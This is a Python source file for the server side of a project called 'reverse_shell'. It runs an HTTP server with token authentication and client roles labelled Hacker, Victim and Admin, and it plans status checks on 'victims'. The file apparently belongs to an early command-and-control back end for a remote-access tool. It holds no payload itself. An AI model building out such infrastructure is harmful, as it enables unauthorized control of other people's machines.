from reverse_shell import __app_name__, __version__
from reverse_shell.server import ErrorCodes
import reverse_shell.utils as ut
from pathlib import Path
from http.server import BaseHTTPRequestHandler, HTTPServer
from http import HTTPStatus, HTTPMethod as mth
from argparse import ArgumentParser, ArgumentDefaultsHelpFormatter, Namespace
from functools import partial
from json import dumps
import sys
import binascii


class Config:
    """ Validate user given data to produce data that the app can safely use."""

    def __init__(self, config: Namespace):
        self.config = config

        # ---------- The config fields ---------- #

        # ---- Tokens
        self.auth_token = self.get_token("auth_token")
        self.admin_token = self.get_token("admin_token")
        self.hacker_token = self.get_token("hacker_token")

        # ---- Session name and the base_dir
        self.base_dir = self.config.server_dir
        self.current_session_name = self.get_session_name()
        self.new_session_file_needed = self.session_file_needed()

        # ---- Session data
        self.data = self.get_session_data()
        # Put important parts of the data that need
        # authentication. Use their request_path

        # This is not complete and is going to be remade in the future
        self.auth_data = {
            "/clients": {
                ut.ClientType.Hacker: [mth.GET, mth.POST],
                ut.ClientType.Victim: [mth.POST, mth.PATCH],
                ut.ClientType.Admin: [mth.POST, mth.PATCH, mth.GET, mth.DELETE]
            }
        }
        self.request_data = self.get_request_paths()   # Forgive me for the variable naming. I am terrible at naming variables.

        # ---- Python and response type map
        self.py_res_type_map = {
            str: "plain/text",
            dict: "application/json",
            list: "application/json"
        }

        # ---- IP and PORT
        self.port = self.get_port()
        self.ip = self.config.ip

    def get_port(self):
        """ Verify if the port is between the usable limit. """
        if 1 <= (port := self.config.port) <= 65535:
            return port
        else:
            ut.log("error", "Port out of range!")
            sys.exit(ErrorCodes.port_out_of_range)

    def update_request_paths(self):
        """ Update the request path data. """
        self.request_data = self.get_request_paths()

    def get_request_paths(self):
        """ Return the request path version of the configuration data. Returns `None` if the path is not in `self.request_data` """
        # We will use the method in the Config class for making this usable
        return self.dict_to_request_path(self.data)

    def get_data_from_path(self, path: str):
        """ Obtain the data from the path. """
        try:
            list_path = self.request_data[path]
            # Get the data
            latest_data = self.data
            for key in list_path:
                latest_data = latest_data[key]
            return latest_data
        except KeyError:
            return None

    def dict_to_request_path(self, object: dict, parent: str = "/", prev_list_path: list = []):
        """ A linear(not nested) dictionary with HTTP request path like keys assigned to a special python list that is used to get to data. make sure the parent string has a '/' at the end."""

        # This function is made for recursion so keep that in mind future me!
        # The object is the dictionary we are going to loop on, the parent is the base before
        # string path, and the prev is an extension to what the function will produce now
        final_result = {}

        for key, value in object.items():
            path_to_key = f"{parent}{key}"
            # We're gonna set the value to the previous plus the new key
            # to get to the desired value.
            current_list_path = [*prev_list_path, key]
            final_result[path_to_key] = [*prev_list_path, key]
            if isinstance(value, dict):
                # If the value is a dictionary then we need to recurse the whole process
                # Then we store what the recursed function returned and add it to the path_to_string
                # to be returned
                result = self.dict_to_request_path(value, parent=f"{path_to_key}/", prev_list_path=current_list_path)
                final_result = {**final_result, **result}
        return final_result

    def get_session_data(self):
        """ Get the data from our session file if it exists else generate one with the default mockup """
        # Defining the default contents of the data field
        # The data field is not complete, it'll be soon tho

        # This is demo data, used for testing
        default_data_contents = {
            "clients": {
                "3414123412513": {
                    "client-type": ut.ClientType.Admin,
                    "client-name": "bython"
                }
            }
        }

        data = self.get_from_session("data")

        if data is None:
            # We don't have the data(in other words we don't have the session file given by the user)
            return default_data_contents

        if not (set(default_data_contents) <= set(data)):
            # This simply means that the data from which we obtain the session data doesn't have
            # the fields we need so we are going to tell the user to input a correct
            # server generated file
            ut.log("error", "Invalid session file. Please use server generated session files.")
            sys.exit(ErrorCodes.invalid_file)

        return data

    def session_file_needed(self):
        """ Check if the current session is a new session. """
        if self.config.from_session is None and not self.config.no_session_file:
            # Now we know that it's indeed a new session
            # since the user didn't provide a session file to start from
            return True
        return False

    def get_session_name(self):
        """ Get the name of the session, either the local date, if the user doesn't provide one use the current date as one. """
        session_name = self.config.session_name
        if session_name is None:
            # Well now this means the user didn't provided a session name
            # So we will use the current date as one
            session_name = ut.get_formatted_time()

        return session_name

    def get_token(self, token_name: str):
        """ Get the requested token and generate a new one if the token doesn't exist."""
        token = self.get_from_session(token_name)

        if token is None:
            # This means there is no session file given by the user
            # so we are going to generate a new token
            token = ut.generate_token()

        return token

    def get_from_session(self, key: str):
        """ Get a value in the sessions_file using it's `key`. Returns None if the `self.config.from_session`
        argument is None."""

        # Checking for preconditions before accessing from the file
        if self.config.from_session is None or self.config.no_session_file:
            return None

        if not self.config.from_session.is_file():
            ut.log("error", "Provided session file is not found!")
            sys.exit(ErrorCodes.file_not_found)

        # Now we know the file exists because of the previous statements
        # So now we are going to validate the file that the user gave us
        session_details = ut.read_json(self.config.from_session)

        if session_details is None:
            # This means that there was a json.JSONDecodeError so
            ut.log("error", "Invalid session file. Please use server generated session files.")
            sys.exit(ErrorCodes.invalid_file)

        # Check if the given key exists in the session file else return None
        try:
            value = session_details[key]
        except KeyError:
            ut.log("error", "Invalid session file. Please use server generated session files.")
            sys.exit(ErrorCodes.invalid_file)

        return value


class DespicableServer(BaseHTTPRequestHandler):
    """ Handles all http requests """

    def __init__(self, config: Config, *args, **kwargs):
        self.configuration = config
        self.data = config.data

        # Initialize the BaseHTTPRequestHandler
        super().__init__(*args, **kwargs)

    def my_send_error(self, error_type: HTTPStatus):
        """ Sends an error and stops execution """
        self.send_error(error_type)
        self.end_headers()

    def is_authorized(self):
        """ Check if our user is authenticated to use our server (in other words has the authentication token) """
        authorization_header = self.headers.get("Authorization")

        # If our authorization header doesn't exist then return false right away
        if authorization_header is None:
            self.my_send_error(HTTPStatus.UNAUTHORIZED)
            return False

        # Ok so now we have an authorization header. let's make sure that it is
        # indeed our authorization token, but before that we should check that the
        # string the user sent is base64 encrypted. And we know that by trying to decode
        # the token using base64 and if the token doesn't decode successfully
        # then it means the token is invalid so we'll return False.
        try:
            decoded_token = ut.decode_token(authorization_header)
        except binascii.Error:
            self.my_send_error(HTTPStatus.UNAUTHORIZED)
            return False

        # If the token doesn't match our token then return false too
        if decoded_token != self.configuration.auth_token:
            self.my_send_error(HTTPStatus.UNAUTHORIZED)
            return False

        # If the token passes through all of that then it is indeed our token
        return True

    def get_client_id(self):
        """ Get the id of the client from it's headers. sends 400 error if no header """
        if (client_id := self.headers.get("client-id")) is not None:
            return client_id
        else:
            self.my_send_error(HTTPStatus.BAD_REQUEST)

    def get_client_type(self, client_id):
        """ Get the client type from the configuration data. sends 400 error if it's not found """

        # First obtain the client from the data using it's id if it doesn't
        # exist, we need to send a 400 error and let the user know he needs
        # to post his stuff to the server first

        try:
            # Getting the client type from the clients field in the data config
            return self.configuration.data["clients"][client_id]["client-type"]
        except KeyError:
            # Send the 400 error and get tell the user to get out of here
            self.my_send_error(HTTPStatus.BAD_REQUEST)
            return None

    def do_GET(self):
        """ Handle our get requests"""

        # First check if we are not authenticated or we don't have an id, quit right away
        # by authenticated I meant: has the necessary tokens, has an ID header, has his
        # client data stored in the servers database
        not_authorized = not self.is_authorized()
        dont_have_id = (client_id := self.get_client_id()) is None
        client_not_in_data = (client_type := self.get_client_type(client_id)) is None
        print(client_type, client_id)
        if not_authorized or dont_have_id or client_not_in_data:
            return

        # The plan is to get the user something from the
        # data field in our configuration. if the field
        # the user is looking for doesn't exist then we are going
        # to send a 404 error else we are going to give the query the
        # user is asking for. of course we need to check for privileges before
        # handing the data to the client.

        # Do the magic

        # We will now turn the data to the path like structures
        # and match that with the user

        # Check if it is valid to GET request this path
        if mth.GET not in self.configuration.auth_data[self.path][client_type]:
            self.my_send_error(HTTPStatus.UNAUTHORIZED)
            return

        # Obtain the data with some magic. just kidding go and read the function
        sent_data = self.configuration.get_data_from_path(self.path)

        # Check if the user set path exists in the path_data
        if not sent_data:
            self.my_send_error(HTTPStatus.NOT_FOUND)
            return

        # Now finally send the data to the client

        # The binary, json.dumps version of the sent_data
        # Yup it also works for the string types don't worry
        final_data = bytes(dumps(sent_data), encoding="utf-8")

        # Do some magic and get the content-type to be sent
        self.send_response(HTTPStatus.OK)
        self.send_header("content-type", self.configuration.py_res_type_map[type(sent_data)])
        self.send_header("content-length", str(len(final_data)))
        self.end_headers()

        # Sending the data
        self.wfile.write(final_data)


class Session:
    """ A single server instance with it's tokens, files and etc..."""

    def __init__(self, config: Config):
        self.configuration = config

        # Smartly create session files
        self.create_session_file()

    def start_server(self):
        """ Start the HTTP server """

        # Using local variables to shorten the names of the ip and port
        ip = self.configuration.ip
        port = self.configuration.port

        # We are using partials because only can pass the class to
        # HTTPServer not an object so we can use functools.partial to solve
        # the issue.
        despicable_handler = partial(DespicableServer, self.configuration)

        # Initiate the server
        ut.log("debug", f"Server is starting on ({ip}:{port})...")
        server = HTTPServer((ip, port), despicable_handler)
        ut.log("success", "Server has successfully started!")
        # Means print an empty line, i think...
        print("\r")
        ut.log("info", "-------- Tokens --------")
        ut.log("info", f"Authentication Token: {self.configuration.auth_token}")
        ut.log("info", f"Administration Token: {self.configuration.admin_token}")
        ut.log("info", f"Hacking Token: {self.configuration.hacker_token}")

        # Create some empty space for the proceeding
        print("\r")
        # Create a header for the logs that the http server generates
        ut.log("info", "--------- Server Logs --------")

        try:
            server.serve_forever()
        except KeyboardInterrupt:
            # It's because we use keyboard interrupt normally to stop
            # the server.
            pass

        ut.log("debug", f"Server has shutdown!")
        sys.exit(0)

    def create_session_file(self):
        """ Create a session file based on the configuration """
        if not self.configuration.new_session_file_needed:
            # if a new session is not needed then just do nothing
            return

        # Session file contents in a python dict
        session_file_contents = {
            # The current time
            "time": ut.get_formatted_time(),

            # The tokens
            "auth_token": self.configuration.auth_token,
            "hacker_token": self.configuration.hacker_token,
            "admin_token": self.configuration.admin_token,

            # data
            "data": self.configuration.data
        }

        # If that's so(means, the we're running is brand new) let's create a session file
        # First create local variables for the configs we use
        base_dir = self.configuration.base_dir
        session_name = self.configuration.current_session_name

        # First creating the sessions directory
        sessions_dir = base_dir / Path("./sessions")
        sessions_dir.mkdir(parents=True, exist_ok=True)

        session_file_path = sessions_dir / Path(f"{session_name}.json")

        # Write the python dictionary into a json file
        ut.write_json(session_file_path, session_file_contents)


class StartServer:
    """ Initialize a session"""

    def __init__(self):
        self.configuration = self.parse_arguments()
        self.current_session = Session(self.configuration)
        self.current_session.start_server()

    def parse_arguments(self):
        """ Argument parsing """
        parser = ArgumentParser(prog=f"{__app_name__} server",
                                description=f"The server for the {__app_name__} project",
                                formatter_class=ArgumentDefaultsHelpFormatter
                                )

        parser.add_argument("--from-session", "-fs", type=Path, required=False, help="Server generated session file used to re-initiate the same session as the previous.", default=None)

        parser.add_argument("--server-dir", "-sd", type=Path, required=False, help="Directory where the server will store it's data like logs and etc...", default=Path("server_data"))

        parser.add_argument("--session-name", "-sn", type=str, required=False, help="Give this session a name to make it easy to remember(default is the current date)", default=None)

        parser.add_argument("--no-session-file", "-nsf", action="store_true", help="If the flag is used, a session file for the current session will not be generated.")

        # NotImplemented yet, but will be soon
        parser.add_argument("--pulse-check-frequency", "-pcf", required=False, help="Frequency of the server checking the status of the victims for their status(online or offline).")

        parser.add_argument("-p", "--port", type=int, required=False, help="The port on which the server runs on.", default=80)

        parser.add_argument("-i", "--ip", type=str, required=False, help="The ip where the server is hosted on.", default="0.0.0.0")

        parser.add_argument("--version", "-v", action="version", version=f"{__app_name__} server v{__version__}")

        config = Config(parser.parse_args())

        return config


if __name__ == "__main__":
    # Well let's do this
    StartServer()
